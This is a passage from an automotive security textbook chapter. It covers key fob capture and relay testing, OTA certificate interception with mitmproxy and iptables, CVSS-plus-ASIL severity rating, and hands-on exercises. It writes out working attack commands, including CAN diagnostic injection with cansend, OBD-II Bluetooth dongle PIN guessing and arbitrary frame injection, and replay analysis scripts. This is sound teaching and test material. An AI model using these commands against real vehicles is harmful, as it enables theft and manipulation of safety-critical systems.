**Signal capture.** Use an SDR (HackRF One, RTL-SDR for receive-only, YARD Stick One for sub-GHz) to capture key fob transmissions. Identify the operating frequency (typically 315 MHz North America, 433.92 MHz Europe/Asia), modulation (ASK/OOK for older systems, FSK for newer), and encoding scheme:

```bash
# Capture key fob RF transmissions with rtl_433
rtl_433 -f 433920000 -s 1000000 -Y autolevel -F json > keyfob_captures.json

# Analyze with inspectrum for visual signal analysis
inspectrum -r 1000000 captured_signal.cu8

# Test for fixed-code vulnerability (CVE-2022-27254 pattern)
# Capture 10+ lock/unlock transmissions
# Compare bitstreams — if identical across transmissions, fixed-code confirmed
python3 -c "
import json
captures = []
with open('keyfob_captures.json') as f:
    for line in f:
        try:
            obj = json.loads(line)
            if 'bits' in obj or 'data' in obj:
                captures.append(obj.get('bits', obj.get('data', '')))
        except json.JSONDecodeError:
            continue

unique = set(captures)
print(f'Total captures: {len(captures)}')
print(f'Unique bitstreams: {len(unique)}')
if len(unique) < len(captures) * 0.5:
    print('WARNING: Fixed-code or weak rolling code detected')
    print('Vulnerability: CWE-294 (Authentication Bypass by Capture-replay)')
else:
    print('Rolling code appears functional — test for RollJam or predictability')
"
```

**Relay attack testing.** Test PKE relay vulnerability using two devices (e.g., Hellen BLE relay boards for BLE-based keys, or purpose-built LF/UHF relay kits for traditional PKE). Measure the maximum relay distance at which the vehicle still authenticates. Test UWB distance-bounding effectiveness if equipped — the vehicle should reject authentication when UWB ToF indicates distance > 2 meters despite BLE RSSI indicating proximity.

**Rolling code analysis.** Capture a sequence of 20+ consecutive key fob transmissions. Analyze the rolling code progression: is it sequential (predictable), LFSR-based (potentially reversible with known algorithms like KeeLoq), or cryptographically random (AES-128-based)? For KeeLoq-based systems, test whether the manufacturer key can be derived using known algebraic or side-channel attacks (Garcia et al., RFIDsec 2008; Kasper et al., CHES 2009).

### 13.4 OTA update security assessment

**Certificate validation.** Intercept the TLS connection between the TCU and OTA server (using a test MITM proxy with a custom CA installed on the TCU, or by modifying the TCU's trust store in the test environment). Verify:

```bash
# OTA TLS interception test setup
# Install mitmproxy CA on test TCU (requires root on TCU)

# 1. Start mitmproxy
mitmproxy --mode transparent --listen-host 0.0.0.0 --listen-port 8080 \
    --set ssl_insecure=true --save-stream-file ota_capture.flow

# 2. Redirect TCU traffic through proxy (via test network gateway)
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
    -j REDIRECT --to-port 8080

# 3. Trigger OTA check on vehicle
# Observe whether TCU:
# a) Accepts the proxy's certificate (FAIL — no cert pinning)
# b) Rejects and falls back to cleartext (FAIL — downgrade attack)
# c) Rejects and refuses to connect (PASS — cert pinning enforced)

# 4. Test Uptane metadata verification
# Modify Director metadata: change target firmware hash
# Observe whether vehicle detects the mismatch with Image repository
# This validates the Uptane dual-repository cross-check (§6.3)
```

**Rollback protection.** Attempt to install a firmware version older than the currently installed version. A secure OTA system rejects rollback unless explicitly authorized by the OEM (with a specific rollback authorization token in the Uptane Director metadata). Test by modifying the version field in the update metadata to a previous version number while keeping the signature valid (if you have access to the test signing key).

**Delta update integrity.** If the OTA system uses delta updates (binary diffs applied to the current firmware to produce the new version), test whether a corrupted delta is detected before application. A truncated or modified delta that passes integrity checks but produces an incorrect output binary could brick the ECU or introduce a backdoor.

### 13.5 Reporting: automotive-specific severity rating

Standard CVSS scores do not capture the safety impact of automotive vulnerabilities. Augment CVSS with a Safety Impact Factor (SIF) derived from ISO 26262 ASIL (Automotive Safety Integrity Level) classification:

| ASIL | Safety Impact | Examples | SIF Multiplier |
|------|--------------|----------|----------------|
| QM | No safety relevance | Infotainment cosmetic bug | 1.0x |
| ASIL A | Low possibility of injury | Window/mirror malfunction | 1.2x |
| ASIL B | Moderate possibility of injury | Exterior lighting failure, ABS degradation | 1.5x |
| ASIL C | High possibility of injury | EPS failure, unintended acceleration | 1.8x |
| ASIL D | Life-threatening | Steering loss, brake failure, airbag suppression | 2.0x |

**Adjusted severity = CVSS Base Score x SIF Multiplier** (capped at 10.0).

Example: A CAN injection vulnerability with CVSS 6.8 (CVE-2023-29389, Toyota RAV4) that enables steering manipulation targets an ASIL D function. Adjusted severity: 6.8 x 2.0 = 10.0 (critical, life-threatening).

The report should also map each finding to:

1. **UN R155 Annex 5 threat category** (e.g., "Threats to vehicles regarding their communication channels" → "Spoofing of messages").
2. **ISO/SAE 21434 TARA risk level** (negligible, low, medium, high, critical) based on attack feasibility and impact.
3. **CWE identifier** for the root cause weakness.
4. **Reproducible proof-of-concept** with exact commands, hardware requirements, and vehicle conditions.
5. **Remediation diff** — specific code/configuration change to fix the vulnerability, with verification test.

```
# Example finding format for automotive security report

FINDING ID: VST-2025-007
TITLE: Gateway permits diagnostic-format messages from infotainment bus
CVSS: 7.2 (AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N)
SIF: ASIL C → 1.8x multiplier
ADJUSTED SEVERITY: 10.0 (CRITICAL)
CWE: CWE-284 (Improper Access Control)
UN R155: Annex 5, §7.2.2.2 — "Spoofing messages ... by impersonation"
ISO 21434 TARA: HIGH (attack feasibility = medium, impact = critical)

DESCRIPTION:
  The gateway ECU forwards CAN frames with arbitration IDs in the
  diagnostic range (0x7DF, 0x7E0-0x7E7) originating from the
  infotainment CAN port to the powertrain and chassis buses. This
  enables an attacker who has compromised the IVI (via §4 attack chain)
  to issue UDS diagnostic commands to safety-critical ECUs.

REPRODUCTION:
  1. Obtain root shell on IVI (see §4.2 Linux IVI exploitation)
  2. Attach to IVI's internal CAN interface: ip link set can1 up
  3. Inject diagnostic request: cansend can1 7DF#0210010000000000
  4. Observe response on powertrain bus: candump can0 (response 7E8#...)
  5. Confirmed: gateway forwarded diagnostic request from infotainment

REMEDIATION:
  Gateway routing table: add explicit BLOCK rule for arbitration IDs
  0x7DF and 0x7E0-0x7EF originating from INFOTAINMENT bus port.
  
  # Gateway config change:
  # BLOCK: INFOTAINMENT, 0x7DF, *, *, *, DROP
  # BLOCK: INFOTAINMENT, 0x7E0-0x7EF, *, *, *, DROP

VERIFICATION:
  After remediation, repeat step 3. Confirm no response on powertrain bus.
```

---

## 14. Cross-references

**To Chapter 21A:** In-vehicle network knowledge (CAN format, UDS services, SOME/IP, SecOC) is the foundation for the attacks here. Gateway bypass (§1) chains with CAN injection (Chapter 21A §4). UDS SecurityAccess (Chapter 21A §4.5) is the authentication barrier for ECU reprogramming via J2534 (§2.3) and the target of the kill chains in §5. Detection engineering (§10) complements CAN-frame-level IDS rules in Chapter 21A §11D with vehicle-attack-level detection patterns. Forensics (§11) extends Chapter 21A CAN traffic capture tooling (§11A) with infotainment, telematics, and charging session artifact recovery.

**To Domain 17 (physical):** Fault injection (Chapter 17 §4) on automotive MCUs bypasses secure boot and SecurityAccess. ECU firmware extraction via JTAG/SWD (Chapter 17 §3.3, Chapter 12B §2.2) enables UDS algorithm reversing (Chapter 21A §4.5). ECU memory forensic extraction (§11.1) uses non-invasive UDS reads where possible, falling back to JTAG when diagnostic access is unavailable.

**To Domain 18 (adversarial ML):** Adversarial patches (§7.2) and sensor spoofing (§7) target ML models in ADAS ECUs. Multi-sensor fusion attacks (§7.5) exploit model-confusion principles from Domain 18 §1.3. Autonomous vehicle AI/ML attacks (§12.3) extend these techniques to planning-pipeline and model-extraction attacks.

**To Domain 16 (ICS):** V2G (§9.4) connects vehicles to the power grid. Grid-side protocols (IEC 61850, IEC 104) from Domain 16 apply to charging infrastructure. Coordinated automotive-grid attacks represent cross-domain cyber-physical threats. Bidirectional V2G attacks (§12.2) introduce grid destabilization vectors via compromised V2G aggregators.

**To Domain 20 (GNSS/positioning):** GPS spoofing (Domain 20 §3.3) is a prerequisite for plausible V2X position spoofing (§8.5) and compromises ADAS fusion relying on GPS for map-matching and trajectory prediction. Fleet management geofencing bypass (§12.5) depends on GPS spoofing at the TCU level.

---

## Exercises

**Exercise 1 — Gateway Domain Isolation Testing.**
On an automotive bench setup with multiple CAN buses (or a simulated environment using two virtual CAN interfaces `vcan0` and `vcan1` bridged by a Python gateway script), test gateway filtering rules. (a) Configure the gateway script to whitelist specific arbitration IDs for forwarding between buses (e.g., 0x0C8 powertrain→infotainment, 0x7DF diagnostic→all). (b) From the infotainment-side interface (`vcan1`), inject diagnostic-range frames: `cansend vcan1 7DF#0210030000000000` (DiagnosticSessionControl Extended). Monitor the powertrain-side interface (`vcan0`) with `candump -t a vcan0` and document whether the gateway forwards the frame. (c) Systematically test the full ID range 0x000–0x7FF from the infotainment side, logging which IDs pass through. (d) Identify any gateway bypass by finding forwarded IDs that should be blocked. (e) Implement a fix in the gateway script (explicit BLOCK rule for diagnostic IDs from infotainment) and re-test. Deliverable: gateway test report with pass/fail matrix per ID range, identified bypasses, remediation applied, and post-fix verification results.

**Exercise 2 — OBD-II Dongle Bluetooth Exploitation.**
Acquire a low-cost ELM327-compatible Bluetooth OBD-II dongle (widely available for under $20). (a) Scan for the dongle's Bluetooth service with `sdptool browse <BD_ADDR>` or `bluetoothctl`. Document whether pairing requires a PIN (test defaults: 0000, 1234) or uses Just Works mode. (b) Connect via RFCOMM: `rfcomm connect hci0 <BD_ADDR> 1`. (c) Through the serial interface, send AT initialization commands (`ATZ`, `ATE0`, `ATSP6`) and verify connectivity by querying engine RPM (`01 0C`). (d) Set a custom CAN header with `ATSH 2A0` (hypothetical body-control ID) and send arbitrary data bytes. Document whether the dongle filters or passes arbitrary arbitration IDs. (e) Write a Python script that automates: Bluetooth connection → AT initialization → UDS DiagnosticSessionControl → SecurityAccess seed request, demonstrating that the dongle provides unrestricted CAN bus access. Deliverable: exploitation report documenting Bluetooth authentication weakness, unrestricted CAN injection capability, and recommended dongle hardening measures (Bluetooth authentication enforcement, CAN ID whitelisting at the dongle firmware level, gateway filtering for OBD-II port traffic).

**Exercise 3 — Key Fob Relay Attack Analysis and UWB Countermeasure Assessment.**
(a) Research and document the PKE relay attack hardware components: LF receiver (125 kHz), uplink transmitter (2.4 GHz), LF emitter, downlink receiver. Calculate the signal propagation time for a 50-meter relay link (speed of light: ~3.33 ns/m → ~167 ns one-way, ~334 ns round-trip) and compare against a typical PKE system timeout of 10–30 ms. Explain why the relay succeeds. (b) Research the UWB IEEE 802.15.4z distance-bounding mechanism: calculate the round-trip time of flight for a legitimate 2-meter proximity check (~13.4 ns) versus a 50-meter relay (~334 ns). Explain why the 25x timing difference is detectable at UWB's sub-nanosecond resolution. (c) Research the CCC Digital Key 4.0 specification (announced July 2025): document the BLE + UWB + NFC multi-layer architecture and its relay-resistance properties. (d) Analyze the NCC Group BLE relay attack against Tesla Model 3 (Sultan Qasim Khan, 2022): document the 8 ms relay latency, Tesla's BLE authentication timeout, and why PIN-to-Drive mitigates the attack at the vehicle-access layer. Deliverable: comparative security analysis table (PKE relay, BLE relay, UWB distance bounding) with attack feasibility, hardware cost, detection mechanism, and recommended countermeasure for each.

**Exercise 4 — Uptane OTA Metadata Verification Walkthrough.**
Using the Uptane reference implementation or documentation, trace the complete metadata verification chain. (a) Document the Root role: key hierarchy, threshold signing (M-of-N), key rotation procedure. (b) Trace a Timestamp → Snapshot → Targets verification for a hypothetical firmware update: verify the Timestamp signature and expiration, verify the Snapshot hash matches the Timestamp reference, verify the Targets metadata version matches the Snapshot manifest. (c) Simulate a freeze attack: serve Timestamp metadata with an expired timestamp. Verify that the vehicle-side verification rejects the stale metadata. (d) Simulate a rollback attack: serve Targets metadata with a version number lower than the ECU's current installed version. Verify that version-monotonicity enforcement rejects the downgrade. (e) Simulate a Director-only compromise: modify the Director's Targets metadata to point an ECU to a different (but legitimately signed by the Image repository) firmware image. Verify that the split-repository cross-validation catches the mismatch if the Image repository's Targets metadata does not list that image for that ECU. Deliverable: Uptane verification trace document with step-by-step metadata inspection, attack simulation results, and mapping of each attack to the Uptane role/mechanism that defends against it.

**Exercise 5 — LiDAR Spoofing Threat Model and Multi-Sensor Fusion Defense Analysis.**
(a) Research the Shin et al. (USENIX Security 2017) LiDAR spoofing hardware setup: document the APD detector, FPGA timing controller, and 905 nm laser diode specifications. Calculate the cost and range of the attack. (b) Research the Cao et al. (CCS 2019) adversarial 3D object injection: explain how ~100 spoofed points per scan can cause PointPillars/PointRCNN to classify the cluster as a vehicle with >80% confidence. (c) Analyze multi-sensor fusion as a defense: if LiDAR reports a phantom vehicle at 30 meters but RADAR returns no reflection and the camera shows no visual object, how should the fusion algorithm resolve the conflict? Document the decision logic for at least two fusion architectures (early fusion vs. late fusion). (d) Research temporal consistency filtering: define a rule that rejects phantom objects appearing and disappearing between frames without physically plausible trajectory (e.g., object materialization at >100 km/h without prior track). (e) Propose a detection pipeline combining multi-sensor cross-validation, temporal consistency, and pulse fingerprinting that would detect the Shin et al. attack. Deliverable: threat model document with attack hardware BOM, spoofing feasibility assessment, fusion-based detection architecture, and residual risk analysis.

---

## Readings and References

- ISO/SAE 21434:2021, "Road vehicles — Cybersecurity engineering." International Organization for Standardization / SAE International.
- UNECE, "UN Regulation No. 155 — Uniform provisions concerning the approval of vehicles with regards to cyber security and cyber security management system," 2021. <https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=OJ:L_202500005> (retrieved: 2026-05-29)
- ISO 24089:2023, "Road vehicles — Software update engineering." International Organization for Standardization.
- Uptane Project (NYU / UMTRI), "Uptane: Securing Software Updates for Automobiles," IEEE 2680-2022. <https://uptane.org/> (retrieved: 2026-05-29)
- Kuppusamy, T. K. et al., "A Comprehensive, Automated Security Analysis of the Uptane Automotive OTA Framework," ACM RAID 2024. <https://dl.acm.org/doi/10.1145/3678890.3678927> (retrieved: 2026-05-29)
- Miller, C. and Valasek, C., "Remote Exploitation of an Unaltered Passenger Vehicle," Black Hat USA 2015. CVE-2015-5611.
- Nie, S. et al. (Keen Security Lab), "Free-Fall: Hacking Tesla from Wireless to CAN Bus," Black Hat USA 2017. CVE-2016-9862 through CVE-2016-9864.
- Computest, "The Connected Car — Ways to Get Unauthorized Access and Potential Implications," 2018. <https://www.computest.nl/knowledge-platform/rd-projects/car-hack/>
- Khan, S. Q. (NCC Group), "Technical Advisory — BLE Proximity Authentication Vulnerable to Relay Attacks," May 2022. <https://research.nccgroup.com/2022/05/15/technical-advisory-ble-proximity-authentication-vulnerable-to-relay-attacks/>
- CCC (Car Connectivity Consortium), "Digital Key 4.0 Specification," July 2025. <https://carconnectivity.org/digital-key/> (retrieved: 2026-05-29)
- VicOne, "From Fob to Phone: How CCC Digital Key 4.0 Shapes Automotive Cybersecurity," 2025. <https://vicone.com/blog/from-fob-to-phone-how-ccc-digital-key-40-shapes-automotive-cybersecurity/> (retrieved: 2026-05-29)
- Shin, H. et al., "Illusion and Dazzle: Adversarial Optical Channel Exploits Against Lidars," USENIX Security 2017.
- Cao, Y. et al., "Adversarial Objects Against LiDAR-Based Autonomous Driving Systems," ACM CCS 2019.
- Eykholt, K. et al., "Robust Physical-World Attacks on Deep Learning Models," CVPR 2018 (adversarial patches on traffic signs).
- Petit, J. et al., "Remote Attacks on Automated Vehicles Sensors: Experiments on Camera and LiDAR," Black Hat Europe 2015.
- Cyeqt, "UN R155 Worldwide: How Countries Regulate Vehicle Cybersecurity in 2025," <https://www.cyeqt.com/en/un-r155-worldwide-how-countries-regulate-vehicle-cybersecurity-in-2025/> (retrieved: 2026-05-29)
- Applied Intuition, "Automotive Cybersecurity: ISO/SAE 21434," <https://www.appliedintuition.com/blog/iso-sae-21434-shaping-automotive-cybersecurity> (retrieved: 2026-05-29)
- CVE-2016-9862 — Tesla Model S WebKit use-after-free (browser → CID RCE). CVSS 8.1.
- CVE-2021-22156 — QNX BadAlloc integer overflow (remote ECU code execution). CVSS 9.8.
- CVE-2022-44458 — Hyundai/Kia immobilizer bypass via CAN injection (missing SecOC). CVSS 6.8.
- CVE-2023-29389 — Toyota RAV4 CAN injection via headlight connector (missing segmentation). CVSS 6.8.
- SAE, "Cybersecurity in Automotive OTA Update Systems and Automotive Software Stores," SAE Technical Paper 2026-26-0621. <https://saemobilus.sae.org/papers/cybersecurity-automotive-ota-update-systems-automotive-software-stores-2026-26-0621> (retrieved: 2026-05-29)

---

## Cross-References

| Domain | Section | Relationship | Direction |
|---|---|---|---|
| Chapter 21A — Vehicle Networks | §21A (CAN, UDS, SOME/IP, SecOC) | 21A provides network-level foundations; 21B extends to vehicle-level attacks, gateway bypass, OTA, and sensor spoofing | 21A → 21B |
| Domain 12 — Reverse Engineering | §12B (firmware RE, JTAG) | ECU firmware extraction enables SecurityAccess algorithm reversing and gateway firmware modification | 12 → 21B |
| Domain 16 — ICS/SCADA | §16 (IEC 61850, grid protocols) | V2G connects vehicles to the power grid; bidirectional V2G attacks introduce grid destabilization vectors | 21B → ICS |
| Domain 17 — Physical Security | §17A–B (fault injection, side-channel) | Fault injection on ECU MCUs bypasses SecureBoot; ECU memory forensics via JTAG when UDS access unavailable | 17 → 21B |
| Domain 18 — Adversarial ML | §18 (adversarial patches, model confusion) | ADAS sensor attacks (LiDAR spoofing, camera adversarial patches) target ML models in perception pipelines | 18 → 21B |
| Domain 20 — RF Security | §20A–B (SDR, GPS spoofing, BLE) | GPS spoofing enables V2X position falsification; BLE relay enables vehicle theft; PKE relay uses LF/UHF RF | 20 → 21B |

---

## Glossary

| Term | Definition |
|---|---|
| **Gateway ECU** | Central vehicle module bridging multiple CAN buses and Ethernet segments; enforces routing-table-based domain isolation (the vehicle's internal firewall). |
| **OBD-II (J1962)** | Standardized 16-pin diagnostic connector providing CAN bus access; mandatory on all post-2008 vehicles; attack vector when combined with wireless dongles. |
| **PKE (Passive Keyless Entry)** | Proximity-based vehicle entry using LF (125 kHz) challenge and UHF (315/433 MHz) response; vulnerable to relay attacks extending the apparent key fob range. |
| **UWB (Ultra-Wideband)** | IEEE 802.15.4z ranging technology providing sub-nanosecond time-of-flight measurement (~10 cm precision); relay-resistant due to speed-of-light constraint. |
| **RollJam** | Attack against rolling-code RKE: jam + capture code N, jam + capture code N+1, replay N; attacker retains valid unused code N+1 for later use. |
| **Uptane** | Automotive-specific secure OTA framework (IEEE 2680-2022) extending TUF with per-ECU verification, Director/Image split repositories, and role-based key management. |
| **TARA (Threat Analysis and Risk Assessment)** | ISO/SAE 21434 methodology for systematically identifying threats, assessing risks, and defining cybersecurity goals for vehicle systems. |
| **UNR 155** | UN regulation mandating a Cyber Security Management System (CSMS) for vehicle type approval; mandatory for all new vehicle types from January 2026. |
| **ISO 24089** | Road vehicles standard for software update engineering, harmonized with UN R156; defines requirements for OTA update processes. |
| **V2X (Vehicle-to-Everything)** | Communication between vehicles (V2V), infrastructure (V2I), pedestrians (V2P), and network (V2N) via DSRC 802.11p or C-V2X PC5 sidelink. |
| **SCMS (Security Credential Management System)** | PKI architecture for V2X providing pseudonym certificates, misbehavior detection, and certificate revocation for BSM authentication. |
| **LiDAR spoofing** | Attack injecting phantom points into a LiDAR point cloud using synchronized laser pulses at the sensor's wavelength with FPGA-controlled delay. |
| **Adversarial patch** | Physically printable perturbation optimized to cause CNN misclassification (e.g., stop sign → speed limit) robust across viewing angles and lighting conditions. |
| **DoIP (Diagnostics over IP)** | ISO 13400 protocol encapsulating UDS in TCP/IP; enables diagnostic access over Automotive Ethernet and introduces IP-based attack vectors. |
| **OCPP (Open Charge Point Protocol)** | Communication protocol between EV charging stations (EVSE) and central management systems; versions 1.6 (JSON/WebSocket) and 2.0.1 (with certificate-based security). |
